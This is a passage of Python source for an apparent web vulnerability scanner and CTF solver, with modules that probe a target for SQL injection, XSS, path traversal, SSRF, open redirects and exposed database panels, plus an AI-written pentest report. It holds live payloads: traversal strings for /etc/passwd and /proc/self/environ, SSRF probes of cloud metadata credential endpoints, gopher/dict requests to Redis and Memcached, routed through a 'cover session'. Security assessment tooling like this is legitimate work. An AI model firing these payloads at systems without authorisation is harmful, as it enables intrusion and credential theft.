            sev = "CRITICAL" if acac == "true" else "HIGH"
            self._log("vulnerabilities", sev,
                      "CORS reflects arbitrary Origin" + (" with credentials!" if acac == "true" else ""),
                      f"ACAO: {acao}  ACAC: {acac}  — attacker can read authenticated responses.",
                      "Validate Origin against a hardcoded allowlist; never echo the incoming Origin.")

    # ── API discovery ─────────────────────────────────────────────────────────

    def _discover_apis(self) -> None:
        found: set[str] = set()
        soup = self.main_soup

        # Inline script mining
        for script in soup.find_all("script"):
            if not script.string:
                continue
            src = script.string
            for pat in [
                r'["\'](/api/[^"\'?\s]{1,120})["\']',
                r'fetch\s*\(\s*["\']([^"\']+)["\']',
                r'axios\.\w+\s*\(\s*["\']([^"\']+)["\']',
                r'["\']url["\']\s*:\s*["\']([^"\']+)["\']',
                r'endpoint\s*[=:]\s*["\']([^"\']+)["\']',
            ]:
                for m in re.findall(pat, src):
                    found.add(m)

        # Form actions
        for form in soup.find_all("form"):
            action = form.get("action", "")
            if action and not action.startswith("#"):
                found.add(action)

        # Href /api links
        for a in soup.find_all("a", href=True):
            if "/api/" in a["href"]:
                found.add(a["href"])

        for ref in found:
            self._log("apis", "INFO", f"API reference in source: {ref}",
                      "Endpoint referenced in page HTML/JS.")

        # Active probing of common paths
        for path in COMMON_API_PATHS:
            resp = self._get(self.base_url + path, follow=False, timeout=5)
            if resp and resp.status_code in (200, 201, 401, 403):
                ct = resp.headers.get("Content-Type", "")
                self._log("apis", "MEDIUM" if resp.status_code == 200 else "INFO",
                          f"API endpoint found: {path}",
                          f"Status {resp.status_code} · {len(resp.content):,} bytes · {ct}",
                          "Ensure the endpoint requires authentication and applies rate limiting.")

    # ── JavaScript secret scanning ────────────────────────────────────────────

    def _scan_js(self) -> None:
        soup = self.main_soup
        js_urls: list[str] = []
        for tag in soup.find_all("script", src=True):
            src = tag["src"]
            if src.startswith("//"):
                src = "https:" + src
            elif not src.startswith("http"):
                src = self.base_url + ("" if src.startswith("/") else "/") + src
            js_urls.append(src)

        for url in js_urls[:15]:
            resp = self._get(url, timeout=10)
            if resp is None:
                continue
            content = resp.text
            for pattern, label in JS_SECRET_PATTERNS:
                for match in re.findall(pattern, content):
                    val = match if isinstance(match, str) else match[0]
                    if len(val) < 6:
                        continue
                    self._log("vulnerabilities", "CRITICAL",
                              f"Secret in JavaScript: {label}",
                              f"File: {url}\nValue (partial): {val[:60]}…",
                              f"Move {label} server-side. Never expose secrets in client JavaScript.")

        # Also check inline scripts
        for tag in soup.find_all("script"):
            if not tag.string:
                continue
            for pattern, label in JS_SECRET_PATTERNS:
                for match in re.findall(pattern, tag.string):
                    val = match if isinstance(match, str) else match[0]
                    if len(val) < 6:
                        continue
                    self._log("vulnerabilities", "CRITICAL",
                              f"Secret in inline script: {label}",
                              f"Value (partial): {val[:60]}…",
                              "Remove secrets from inline scripts; use server-side environment variables.")

    # ── sensitive file probing ────────────────────────────────────────────────

    def _check_sensitive_files(self) -> None:
        for path, sev, desc in SENSITIVE_PATHS:
            if path in ("/robots.txt", "/sitemap.xml"):
                continue  # handled separately
            resp = self._attack_get(self.base_url + path, follow=False, timeout=5)
            if resp and resp.status_code == 200 and len(resp.content) > 0:
                snippet = resp.text[:200].replace("\n", " ")
                self._log("vulnerabilities", sev, desc,
                          f"Accessible at {self.base_url + path} ({len(resp.content):,} bytes)\n"
                          f"Preview: {snippet}",
                          f"Block or remove `{path}` via server config / .htaccess / firewall rule.")

    # ── database interface probing ────────────────────────────────────────────

    def _probe_databases(self) -> None:
        parsed = urllib.parse.urlparse(self.url)
        hostname = parsed.hostname

        # Path-based DB panels
        for path, name in DATABASE_ENDPOINTS:
            resp = self._get(self.base_url + path, follow=False, timeout=5)
            if resp and resp.status_code in (200, 401, 403):
                self._log("database", "CRITICAL",
                          f"{name} interface accessible",
                          f"Endpoint: {self.base_url + path}  Status: {resp.status_code}",
                          f"Place {name} behind a VPN or firewall. "
                          "It must never be reachable from the public internet.")

        # Port-based probes (same host, different port)
        for port_suffix, name in DB_PORT_PATHS:
            url = f"{parsed.scheme}://{hostname}{port_suffix}"
            resp = self._get(url, timeout=4)
            if resp and resp.status_code < 500:
                self._log("database", "CRITICAL",
                          f"{name} port exposed",
                          f"Responding at {url} (Status {resp.status_code})",
                          f"Block {port_suffix} in your firewall / security group. "
                          "Database ports must never be internet-facing.")

    # ── SQL injection — 50 payloads via cover session ────────────────────────

    def _test_sqli(self) -> None:
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return

        reported: set[str] = set()
        for param in list(params.keys())[:8]:
            for payload in SQL_PAYLOADS:
                tp = dict(params)
                tp[param] = [params[param][0] + payload]
                turl = parsed._replace(
                    query=urllib.parse.urlencode(tp, doseq=True)
                ).geturl()
                resp = self._attack_get(turl, timeout=7)
                if resp is None:
                    continue
                low = resp.text.lower()
                for err in SQL_ERROR_STRINGS:
                    if err in low and param not in reported:
                        reported.add(param)
                        self._log("vulnerabilities", "CRITICAL",
                                  f"SQL injection in parameter: `{param}`",
                                  f"Payload: {payload!r}\nError pattern matched: «{err}»",
                                  "Use parameterised queries / prepared statements. "
                                  "Never concatenate user input into SQL.")
                        break

    # ── XSS reflection — 50 payloads via cover session ──────────────────────

    def _test_xss(self) -> None:
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return

        reported: set[str] = set()
        for param in list(params.keys())[:8]:
            for payload in XSS_PAYLOADS:
                tp = dict(params)
                tp[param] = [payload]
                turl = parsed._replace(
                    query=urllib.parse.urlencode(tp, doseq=True)
                ).geturl()
                resp = self._attack_get(turl, timeout=7)
                if resp is None:
                    continue
                ct = resp.headers.get("Content-Type", "")
                if "html" not in ct.lower():
                    continue
                # Check if the marker or payload appears unescaped in the response
                reflected = (XSS_MARKER in resp.text or
                             payload.replace("'", "&#39;") not in resp.text and payload in resp.text)
                if reflected and param not in reported:
                    reported.add(param)
                    self._log("vulnerabilities", "HIGH",
                              f"Reflected XSS candidate: parameter `{param}`",
                              f"Payload reflected verbatim in HTML response.\n"
                              f"Payload: {payload[:120]}\nContent-Type: {ct}",
                              "HTML-encode all user input before rendering. "
                              "Use a CSP and a templating engine with auto-escaping.")

    # ── open redirect ─────────────────────────────────────────────────────────

    def _test_open_redirect(self) -> None:
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        redirect_params = [p for p in params if any(
            k in p.lower() for k in ("redirect", "return", "next", "url", "goto", "dest", "target")
        )]
        if not redirect_params:
            return

        evil = "https://evil-attacker.com"
        for param in redirect_params:
            tp = dict(params)
            tp[param] = [evil]
            turl = parsed._replace(
                query=urllib.parse.urlencode(tp, doseq=True)
            ).geturl()
            resp = self._get(turl, follow=False, timeout=7)
            if resp and resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get("Location", "")
                if "evil-attacker.com" in loc:
                    self._log("vulnerabilities", "HIGH",
                              f"Open redirect in parameter: `{param}`",
                              f"Redirects to {loc} without validation.",
                              "Validate redirect targets against an allowlist of trusted domains.")

    # ── HTTP method testing ───────────────────────────────────────────────────

    def _test_http_methods(self) -> None:
        dangerous = ["TRACE", "TRACK", "PUT", "DELETE", "PATCH",
                     "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL",
                     "COPY", "MOVE", "LOCK", "UNLOCK"]
        try:
            opts = self.attack_session.options(
                self.url, timeout=6, verify=False
            )
            allow = opts.headers.get("Allow", opts.headers.get("Public", ""))
            if allow:
                self._log("vulnerabilities", "INFO",
                          "HTTP OPTIONS reveals allowed methods",
                          f"Allow: {allow}",
                          "Restrict allowed methods to GET, POST, HEAD in server config.")
                found = [m for m in dangerous if m in allow.upper()]
                if found:
                    self._log("vulnerabilities", "HIGH",
                              f"Dangerous HTTP methods allowed: {', '.join(found)}",
                              f"Allow header: {allow}",
                              "Disable TRACE/TRACK (XST risk) and PUT/DELETE unless "
                              "explicitly needed by the API.")
        except Exception:
            pass

        for method in ["TRACE", "TRACK"]:
            try:
                r = self.attack_session.request(
                    method, self.url, timeout=6, verify=False
                )
                if r and r.status_code not in (400, 403, 404, 405, 501):
                    self._log("vulnerabilities", "HIGH",
                              f"HTTP {method} enabled — Cross-Site Tracing (XST) risk",
                              f"Server responded {r.status_code} to {method} {self.url}",
                              f"Disable {method} in server config: "
                              "`TraceEnable off` (Apache) / `proxy_pass` drop (Nginx).")
            except Exception:
                pass

    # ── path traversal probing ────────────────────────────────────────────────

    def _test_path_traversal(self) -> None:
        traversal_payloads = [
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2fetc%2fpasswd", "%252e%252e%252fetc%252fpasswd",
            "..\\..\\windows\\win.ini", "..%5C..%5Cwindows%5Cwin.ini",
            "/etc/passwd", "/proc/self/environ", "/windows/win.ini",
        ]
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        path_params = {k: v for k, v in params.items()
                       if any(x in k.lower() for x in
                              ("file", "path", "dir", "page", "include",
                               "load", "doc", "template", "name", "src"))}
        targets = path_params if path_params else dict(list(params.items())[:3])

        unix_sig   = ["root:x:", "root:0:", "/bin/bash", "/bin/sh"]
        win_sig    = ["[fonts]", "[Mail]", "[MCI Extensions.BAK]"]
        env_sig    = ["HOME=", "PATH=", "SHELL=", "USER="]
        signatures = unix_sig + win_sig + env_sig

        for param in targets:
            for payload in traversal_payloads:
                tp = dict(params)
                tp[param] = [payload]
                turl = parsed._replace(
                    query=urllib.parse.urlencode(tp, doseq=True)
                ).geturl()
                resp = self._attack_get(turl, timeout=7)
                if resp is None:
                    continue
                for sig in signatures:
                    if sig in resp.text:
                        self._log("vulnerabilities", "CRITICAL",
                                  f"Path traversal / LFI in parameter `{param}`",
                                  f"Payload: {payload!r}\n"
                                  f"Signature detected: {sig!r}\n"
                                  f"Response preview: {resp.text[:200]}",
                                  "Validate and whitelist file paths server-side. "
                                  "Never pass user input directly to file system calls.")
                        break

    # ── SSRF vector probing ───────────────────────────────────────────────────

    def _test_ssrf(self) -> None:
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",       # AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/iam/",
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/v1/",            # DigitalOcean
            "http://100.100.100.200/latest/meta-data/",       # Alibaba Cloud
            "http://localhost/",
            "http://127.0.0.1/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://localtest.me/",
            "dict://127.0.0.1:11211/",                        # Memcached
            "gopher://127.0.0.1:6379/_PING%0D%0A",           # Redis
            "file:///etc/passwd",
            "file:///windows/win.ini",
        ]
        cloud_sigs = [
            "ami-id", "instance-id", "local-ipv4",           # AWS
            "computeMetadata", "project-id",                  # GCP
            "droplet_id",                                     # DO
            "root:x:",                                        # LFI via SSRF
            "[fonts]",                                        # Windows
        ]
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        url_params = {k: v for k, v in params.items()
                      if any(x in k.lower() for x in
                             ("url", "uri", "src", "dest", "redirect",
                              "link", "href", "host", "endpoint", "target",
                              "proxy", "fetch", "load", "callback", "image"))}
        if not url_params:
            return

        for param in list(url_params.keys())[:5]:
            for payload in ssrf_payloads:
                tp = dict(params)
                tp[param] = [payload]
                turl = parsed._replace(
                    query=urllib.parse.urlencode(tp, doseq=True)
                ).geturl()
                resp = self._attack_get(turl, timeout=8)
                if resp is None:
                    continue
                for sig in cloud_sigs:
                    if sig in resp.text:
                        self._log("vulnerabilities", "CRITICAL",
                                  f"SSRF in parameter `{param}` — cloud metadata accessible",
                                  f"Payload: {payload}\n"
                                  f"Signature: {sig!r}\n"
                                  f"Response: {resp.text[:300]}",
                                  "Validate and whitelist allowed URL schemes and hosts. "
                                  "Block IMDSv1 (use IMDSv2). Enforce egress firewall rules.")
                        break

    # ── form analysis ─────────────────────────────────────────────────────────

    def _analyze_forms(self) -> None:
        for form in self.main_soup.find_all("form"):
            method = form.get("method", "GET").upper()
            action = form.get("action", self.url) or self.url
            inputs = form.find_all("input")

            has_csrf = any(
                any(k in (inp.get("name", "") + inp.get("id", "")).lower()
                    for k in ("csrf", "_token", "authenticity_token", "nonce"))
                for inp in inputs
            )
            if method == "POST" and not has_csrf:
                self._log("vulnerabilities", "HIGH",
                          f"POST form without CSRF token (action: {action})",
                          "State-changing form has no anti-CSRF token — susceptible to CSRF attacks.",
                          "Add a per-session CSRF token field and validate it server-side. "
                          "Also set `SameSite=Strict` on session cookies.")

            # Password fields with autocomplete
            for inp in inputs:
                if inp.get("type", "").lower() == "password":
                    if inp.get("autocomplete", "on").lower() != "off":
                        self._log("vulnerabilities", "LOW",
                                  "Password field with autocomplete enabled",
                                  f"Form action: {action}",
                                  "Add `autocomplete='off'` to password inputs on sensitive forms.")

    # ── CTF artifact mining ───────────────────────────────────────────────────

    def _mine_ctf(self) -> None:
        soup = self.main_soup
        page_text = self.main_response.text

        # HTML comments
        for comment in soup.find_all(string=lambda t: isinstance(t, Comment)):
            text = str(comment).strip()
            if text:
                self._log("ctf", "MEDIUM", "HTML comment found",
                          f"{text[:300]}",
                          "Strip all HTML comments before deploying to production.")

        # Hidden inputs
        for inp in soup.find_all("input", type="hidden"):
            name = inp.get("name", "?")
            value = inp.get("value", "")
            if value:
                self._log("ctf", "LOW", f"Hidden input field: `{name}`",
                          f"value={value[:120]}",
                          "Never trust hidden-field values for security decisions; validate server-side.")

        # Generator / version meta tags
        for meta in soup.find_all("meta"):
            name = meta.get("name", meta.get("property", ""))
            content = meta.get("content", "")
            if any(k in name.lower() for k in ("generator", "version", "author", "framework")):
                self._log("ctf", "LOW", f"Meta tag reveals technology: {name}",
                          f"content={content}",
                          "Remove generator and version meta tags from production HTML.")

        # Base64 strings
        for m in re.findall(r'"([A-Za-z0-9+/]{24,}={0,2})"', page_text):
            try:
                decoded = base64.b64decode(m + "==").decode("utf-8", errors="ignore")
                if decoded.isprintable() and len(decoded) > 4:
                    self._log("ctf", "INFO", "Base64-encoded string detected",
                              f"Encoded: {m[:60]}…\nDecoded: {decoded[:120]}",
                              "Avoid encoding sensitive data in base64 client-side; it is trivially reversible.")
            except Exception:
                pass

        # JWT tokens
        jwt_pat = r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+'
        for jwt in re.findall(jwt_pat, page_text):
            parts = jwt.split(".")
            try:
                header  = json.loads(base64.b64decode(parts[0] + "=="))
                payload = json.loads(base64.b64decode(parts[1] + "=="))
                alg = header.get("alg", "?")
                if alg.upper() in ("NONE", "HS256"):
                    sev = "CRITICAL" if alg.upper() == "NONE" else "HIGH"
                    self._log("ctf", sev, f"JWT exposed in page (alg: {alg})",
                              f"Header: {json.dumps(header)}\nPayload: {json.dumps(payload)}",
                              "Store JWTs in HttpOnly cookies, not page source. "
                              "Use RS256/ES256 instead of HS256. Never allow `alg: none`.")
            except Exception:
                pass

        # Secrets / keys in inline scripts
        for tag in soup.find_all("script"):
            if not tag.string:
                continue
            for kw in ("todo:", "fixme:", "hack:", "password =", "secret =", "key =", "token ="):
                lines = [l.strip() for l in tag.string.splitlines() if kw.lower() in l.lower()]
                for line in lines[:3]:
                    self._log("ctf", "MEDIUM", f"Sensitive keyword in script: `{kw}`",
                              f"{line[:200]}",
                              "Remove debug comments and hard-coded credentials before deploying.")

    # ── robots.txt / sitemap ──────────────────────────────────────────────────

    def _check_robots_sitemap(self) -> None:
        resp = self._get(self.base_url + "/robots.txt", timeout=5)
        if resp and resp.status_code == 200:
            self._log("ctf", "INFO", "robots.txt found",
                      resp.text[:800])
            for path in re.findall(r"(?i)Disallow:\s*(\S+)", resp.text):
                if path != "/" and path:
                    self._log("ctf", "INFO", f"robots.txt discloses hidden path: {path}",
                              f"Disallowed crawl target may reveal admin or sensitive areas.",
                              "Never use robots.txt to 'hide' sensitive paths — use proper auth instead.")

        resp = self._get(self.base_url + "/sitemap.xml", timeout=5)
        if resp and resp.status_code == 200:
            urls = re.findall(r"<loc>([^<]+)</loc>", resp.text)
            self._log("ctf", "INFO", f"sitemap.xml found ({len(urls)} URLs)",
                      "Full site URL structure exposed in sitemap.")


# ─────────────────────────────────────────────────────────────────────────────
# CTF Solver Engine
# ─────────────────────────────────────────────────────────────────────────────

class CTFSolverEngine:
    """
    Auto-detect and recursively decode CTF encoding / cipher challenges.
    Supports: Hex, Binary, Base64/32/58/85, URL, HTML entities, Morse,
              ROT13, ROT47, Caesar brute-force, Atbash, XOR single-byte,
              JWT decode, RSA parameter detection.
    """

    MAX_DEPTH = 8

    # ── public API ────────────────────────────────────────────────────────────

    def solve(self, text: str, custom_flag_re: str = "") -> dict:
        """
        Returns:
          solved       : bool — True if a flag pattern was found
          flag         : str | None — extracted flag text
          chain        : list of step dicts (the winning decode path)
          all_attempts : list of (method, preview) from first-level detection
        """
        text = text.strip()
        flag_re = re.compile(custom_flag_re, re.I) if custom_flag_re else FLAG_RE

        all_first = list(self._detect(text, flag_re))
        visited: set[str] = set()
        chain, solved = self._recurse(text, visited, 0, flag_re)

        flag = None
        for step in chain:
            if step.get("is_flag"):
                m = flag_re.search(step["output"])
                if m:
                    flag = m.group(0)
                break

        return {
            "solved":       solved,
            "flag":         flag,
            "chain":        chain,
            "all_attempts": [(method, out[:120]) for method, out in all_first],
        }

    # ── recursion engine ──────────────────────────────────────────────────────

    def _recurse(self, text: str, visited: set, depth: int,
                 flag_re) -> tuple[list, bool]:
        if depth > self.MAX_DEPTH or text in visited:
            return [], False
        visited = visited | {text}

        if flag_re.search(text):
            return [{"step": 1, "method": "FLAG DETECTED",
                     "input": text[:120], "output": text, "is_flag": True}], True

        candidates = self._detect(text, flag_re)
        first_non_flag: list = []

        for method, decoded in candidates:
            if not decoded or decoded == text or decoded in visited:
                continue

            is_flag_here = bool(flag_re.search(decoded))
            step = {
                "step":    -1,
                "method":  method,
                "input":   text[:120],
                "output":  decoded[:600],
                "is_flag": is_flag_here,
            }

            if is_flag_here:
                step["step"] = 1
                return [step], True

            sub_chain, sub_found = self._recurse(decoded, visited, depth + 1, flag_re)
            if sub_found:
                chain = [step] + sub_chain
                for i, s in enumerate(chain, 1):
                    s["step"] = i
                return chain, True

            if not first_non_flag:
                first_non_flag = [step] + sub_chain

        for i, s in enumerate(first_non_flag, 1):
            s["step"] = i
        return first_non_flag, False

    # ── detection / candidate generation ─────────────────────────────────────

    def _detect(self, text: str, flag_re) -> list[tuple[str, str]]:
        t = text.strip()
        results: list[tuple[str, str]] = []

        def _add(method: str, decoded):
            if decoded and decoded != t:
                results.append((method, decoded))

        # Priority-ordered detection
        _add("JWT decode",         self._try_jwt(t))
        _add("Hex decode",         self._try_hex(t))
        _add("Binary decode",      self._try_binary(t))
        _add("Base64 decode",      self._try_base64(t))
        _add("Base32 decode",      self._try_base32(t))
        _add("Base85 decode",      self._try_base85(t))
        _add("Base58 decode",      self._try_base58(t))
        _add("URL decode",         self._try_url(t))
        _add("HTML entity decode", self._try_html(t))
        _add("Morse decode",       self._try_morse(t))
        _add("ROT13",              self._try_rot13(t))
        _add("ROT47",              self._try_rot47(t))

        caesar = self._try_caesar(t)
        if caesar:
            results.append(caesar)

        _add("Atbash",             self._try_atbash(t))

        for item in self._try_xor_single(t):
            results.append(item)

        rsa = self._try_rsa_detect(t)
        if rsa:
            results.append(("RSA detected", rsa))

        return results

    # ── individual decoders ───────────────────────────────────────────────────

    def _try_hex(self, t: str) -> str | None:
        clean = re.sub(r'[\s:_\-]', '', t)
        if len(clean) < 2 or len(clean) % 2 != 0:
            return None
        if not re.fullmatch(r'[0-9a-fA-F]+', clean):
            return None
        try:
            decoded = bytes.fromhex(clean).decode('utf-8', errors='replace')
            if self._is_printable(decoded):
                return decoded
        except Exception:
            pass
        return None

    def _try_binary(self, t: str) -> str | None:
        clean = re.sub(r'[\s_]', '', t)
        if not re.fullmatch(r'[01]+', clean) or len(clean) % 8 != 0 or len(clean) < 8:
            return None
        try:
            result = ''.join(chr(int(clean[i:i+8], 2)) for i in range(0, len(clean), 8))
            if self._is_printable(result):
                return result
        except Exception:
            pass
        return None

    def _try_base64(self, t: str) -> str | None:
        for variant in (t, t.replace('-', '+').replace('_', '/')):
            padded = variant + '=' * (-len(variant) % 4)
            try:
                decoded = base64.b64decode(padded).decode('utf-8', errors='replace')
                if self._is_printable(decoded) and len(decoded) > 1:
                    return decoded
            except Exception:
                pass
        return None

    def _try_base32(self, t: str) -> str | None:
        clean = re.sub(r'\s', '', t).upper()
        if not re.fullmatch(r'[A-Z2-7=]+', clean) or len(clean) < 8:
            return None
        try:
            padded = clean + '=' * (-len(clean) % 8)
            decoded = base64.b32decode(padded).decode('utf-8', errors='replace')
            if self._is_printable(decoded) and len(decoded) > 1:
                return decoded
        except Exception:
            pass
        return None

    def _try_base85(self, t: str) -> str | None:
        # Python base85
        try:
            decoded = base64.b85decode(t).decode('utf-8', errors='replace')
            if self._is_printable(decoded) and len(decoded) > 1:
                return decoded
        except Exception:
            pass
        # ASCII85 (with or without <~ ~> wrappers)
        try:
            tt = t.strip()
            if tt.startswith('<~') and tt.endswith('~>'):
                tt = tt[2:-2]
            import codecs
            decoded = codecs.decode(tt.encode('ascii'), 'base85').decode('utf-8', errors='replace')
            if self._is_printable(decoded) and len(decoded) > 1:
                return decoded
        except Exception:
            pass
        return None

    def _try_base58(self, t: str) -> str | None:
        if not t or len(t) < 2 or not all(c in BASE58_CHARS for c in t):
            return None
        try:
            n = 0
            for c in t:
                n = n * 58 + BASE58_CHARS.index(c)
            rb: list[int] = []
            while n > 0:
                rb.append(n & 0xFF)
                n >>= 8
            rb.reverse()
            leading = len(t) - len(t.lstrip('1'))
            data = bytes([0] * leading + rb)
            decoded = data.decode('utf-8', errors='replace')
            if self._is_printable(decoded) and len(decoded) > 1:
                return decoded
        except Exception:
            pass
        return None

    def _try_url(self, t: str) -> str | None:
        if '%' not in t:
            return None
        try:
            decoded = urllib.parse.unquote(t)
            if decoded != t and self._is_printable(decoded):
                return decoded
        except Exception:
            pass
        return None

    def _try_html(self, t: str) -> str | None:
        if '&' not in t:
            return None
        try:
            decoded = _html_mod.unescape(t)
            if decoded != t:
                return decoded
        except Exception:
            pass
        return None

    def _try_morse(self, t: str) -> str | None:
        clean = t.strip()
        if not re.fullmatch(r'[.\- /]+', clean):
            return None
        for word_sep in ('/', '   ', '  '):
            words = clean.split(word_sep)
            try:
                decoded_words: list[str] = []
                for word in words:
                    chars: list[str] = []
                    for tok in word.strip().split(' '):
                        tok = tok.strip()
                        if not tok:
                            continue
                        ch = MORSE_TABLE.get(tok)
                        if ch is None:
                            raise ValueError(f"unknown token: {tok!r}")
                        chars.append(ch)
                    if chars:
                        decoded_words.append(''.join(chars))
                if decoded_words:
                    return ' '.join(decoded_words)
            except ValueError:
                continue
        return None

    def _try_rot13(self, t: str) -> str | None:
        if not re.search(r'[A-Za-z]', t):
            return None
        result = t.translate(str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm',
        ))
        return result if result != t else None

    def _try_rot47(self, t: str) -> str | None:
        if not any(33 <= ord(c) <= 126 for c in t):
            return None
        result = t.translate(_ROT47_TABLE)
        return result if result != t else None

    def _try_caesar(self, t: str) -> tuple[str, str] | None:
        if not re.search(r'[A-Za-z]', t):
            return None
        upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        lower = 'abcdefghijklmnopqrstuvwxyz'
        best_shift, best_score, best_text = 0, -1.0, t
        for shift in range(1, 26):
            table = str.maketrans(
                upper + lower,
                upper[shift:] + upper[:shift] + lower[shift:] + lower[:shift],
            )
            shifted = t.translate(table)
            score = self._score_english(shifted)
            if score > best_score:
                best_score, best_shift, best_text = score, shift, shifted
        if best_shift > 0:
            return (f"Caesar ROT{best_shift}", best_text)
        return None

    def _try_atbash(self, t: str) -> str | None:
        if not re.search(r'[A-Za-z]', t):
            return None
        table = str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba',
        )
        result = t.translate(table)
        return result if result != t else None

    def _try_xor_single(self, t: str) -> list[tuple[str, str]]:
        clean = re.sub(r'[\s:]', '', t)
        if not re.fullmatch(r'[0-9a-fA-F]+', clean) or len(clean) % 2 != 0 or len(clean) < 4:
            return []
        try:
            ct = bytearray.fromhex(clean)
        except Exception:
            return []
        n = len(ct)
        threshold_print = n * 0.75

        # Build byte-frequency histogram so each key is scored in O(256) not O(n)
        byte_cnt = [0] * 256
        for b in ct:
            byte_cnt[b] += 1

        scored: list[tuple[float, str, str]] = []
        for key in range(1, 256):
            raw_score = n_alpha = n_print = 0
            for cb in range(256):
                cnt = byte_cnt[cb]
                if not cnt:
                    continue
                xb = cb ^ key
                n_print += _XOR_PRINT_TBL[xb] * cnt
                v = _XOR_FREQ_TBL[xb]
                if v:
                    n_alpha += cnt
                    raw_score += v * cnt

            if n_print < threshold_print or n_alpha == 0:
                continue
            score = raw_score / (n_alpha * 1000)
            if score <= 3.0:
                continue

            pt_bytes = bytes(b ^ key for b in ct)
            try:
                pt = pt_bytes.decode('utf-8')
            except UnicodeDecodeError:
                pt = pt_bytes.decode('latin-1')
            scored.append((score, f"XOR key=0x{key:02x}", pt))

        scored.sort(reverse=True)
        return [(m, txt) for _, m, txt in scored[:3]]

    def _try_jwt(self, t: str) -> str | None:
        if not re.match(r'^eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*$', t):
            return None
        parts = t.split('.')
        try:
            header  = json.loads(base64.b64decode(parts[0] + '=='))
            payload = json.loads(base64.b64decode(parts[1] + '=='))
            alg = header.get('alg', '?')
            return (f"JWT Header : {json.dumps(header)}\n"
                    f"JWT Payload: {json.dumps(payload)}\n"
                    f"Algorithm  : {alg}")
        except Exception:
            pass
        return None

    def _try_rsa_detect(self, t: str) -> str | None:
        found: dict[str, str] = {}
        for key, pat in [('n', r'(?i)n\s*[=:]\s*(\d{10,})'),
                          ('e', r'(?i)e\s*[=:]\s*(\d+)'),
                          ('c', r'(?i)c\s*[=:]\s*(\d{10,})')]:
            m = re.search(pat, t)
            if m:
                found[key] = m.group(1)
        if 'n' in found and 'c' in found:
            e = found.get('e', '65537 (assumed)')
            return (
                f"RSA challenge detected!\n"
                f"  n = {found['n'][:60]}…\n"
                f"  e = {e}\n"
                f"  c = {found['c'][:60]}…\n"
                f"  → Factor n via FactorDB, then:\n"
                f"    phi = (p-1)*(q-1)\n"
                f"    d   = pow(e, -1, phi)   # Python 3.8+\n"
                f"    flag = pow(c, d, n).to_bytes(...).decode()"
            )
        return None

    # ── caesar all-rotations helper (for UI display) ──────────────────────────

    def all_caesar_rotations(self, t: str) -> list[tuple[int, float, str]]:
        """Return [(shift, english_score, decoded), ...] for shifts 1-25."""
        upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        lower = 'abcdefghijklmnopqrstuvwxyz'
        results = []
        for shift in range(1, 26):
            table = str.maketrans(
                upper + lower,
                upper[shift:] + upper[:shift] + lower[shift:] + lower[:shift],
            )
            shifted = t.translate(table)
            results.append((shift, round(self._score_english(shifted), 2), shifted))
        results.sort(key=lambda x: x[1], reverse=True)
        return results

    # ── helpers ───────────────────────────────────────────────────────────────

    def _score_english(self, text: str) -> float:
        total = freq_count = 0.0
        for c in text:
            if c.isalpha():
                total += ENGLISH_FREQ.get(c.lower(), 0.0)
                freq_count += 1.0
        return total / freq_count if freq_count else 0.0

    def _is_printable(self, text: str) -> bool:
        if not text:
            return False
        ok = sum(1 for c in text if c.isprintable() or c in '\n\r\t')
        return ok / len(text) > 0.75


# ─────────────────────────────────────────────────────────────────────────────
# AI Report generator
# ─────────────────────────────────────────────────────────────────────────────

PROVIDERS = {
    "Claude (Anthropic)": {
        "sdk":   "_anthropic_sdk",
        "models": ["claude-opus-4-5", "claude-sonnet-4-6", "claude-haiku-4-5-20251001"],
        "hint":  "sk-ant-…",
    },
    "GPT-4o (OpenAI)": {
        "sdk":   "_openai_sdk",
        "models": ["gpt-4o", "gpt-4o-mini", "gpt-4-turbo"],
        "hint":  "sk-…",
    },
    "Gemini (Google)": {
        "sdk":   "_genai_sdk",
        "models": ["gemini-1.5-pro", "gemini-1.5-flash", "gemini-2.0-flash"],
        "hint":  "AIza…",
    },
}


class AIReporter:
    def __init__(self, provider: str, api_key: str, model: str):
        self.provider = provider
        self.api_key  = api_key
        self.model    = model

    def _build_prompt(self, url: str, findings: dict) -> str:
        flat: list = []
        for items in findings.values():
            flat.extend(items)

        counts: dict = defaultdict(int)
        for f in flat:
            counts[f.get("severity", "INFO")] += 1

        return f"""You are a senior penetration tester writing a professional security report.

Target URL  : {url}
Scan Date   : {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}
Tool        : WhiteClaw v1.0
AI model    : {self.model}

Severity counts:
  CRITICAL : {counts['CRITICAL']}
  HIGH     : {counts['HIGH']}
  MEDIUM   : {counts['MEDIUM']}
  LOW      : {counts['LOW']}
  INFO     : {counts['INFO']}

Raw findings JSON:
{json.dumps(flat, indent=2)}

Write a complete penetration test report with the following sections (Markdown format):

1. **Executive Summary** — 3-4 sentences for a non-technical audience.
2. **Risk Rating** — Overall rating (Critical/High/Medium/Low) with justification.
3. **Critical & High Findings** — For each: title, attacker impact, reproduction steps, remediation with code examples, CWE/OWASP reference.
